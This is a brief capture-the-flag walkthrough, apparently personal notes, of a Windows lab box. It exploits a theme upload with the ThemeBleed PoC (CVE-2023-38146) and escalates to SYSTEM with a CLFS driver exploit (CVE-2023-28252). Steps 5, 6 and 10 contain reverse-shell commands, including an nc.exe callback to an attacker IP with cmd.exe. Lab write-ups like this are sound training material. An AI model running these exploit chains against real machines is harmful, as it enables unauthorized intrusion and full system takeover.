#box #file-upload #themebleed #LogFileSystemDriver
1. We discover a port open on 80, to discover it we run a nmap scan with `--min-rate=10000`
2. On it we discover an upload function, according to it it permits us to upload only `.theme` or `.themepack` files.
   ![[attachments/aero-1.png]]
3. By googling for those extensions vulnerability we discover a vulnerability called ThemeBleed https://www.threatlocker.com/blog/cybersecurity-in-the-news-themebleed-poc-video
4. We discover this PoC adapted for Python https://github.com/Jnnshschl/CVE-2023-38146?tab=readme-ov-file
5. We download it on our end, we install the dependencies with `pip` and then we run it with
```sh
python3 themebleed.py -r 10.10.16.55 -p 4444 # we've tried on port 80 and it wasn't working, so we switched to 4444
```
6. We then proceed to upload the `.themepack`  file from the website while a listener is opened as
```sh
rlwrap -cAr nc -lvnp 4444
```
7. Once on the target machine we discover inside `C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf`
8. Looking at this CVE we discover this is a vulnerability in the Log File System Driver.
9. We discover the following PoC https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252 and proceed to transfer that on the target machine
10. We then use the following command to gain a reverse shell as SYSTEM
```shell
\clfs_eop.exe "C:\Temp\nc.exe -t -e cmd.exe 10.10.16.55 4444"
```

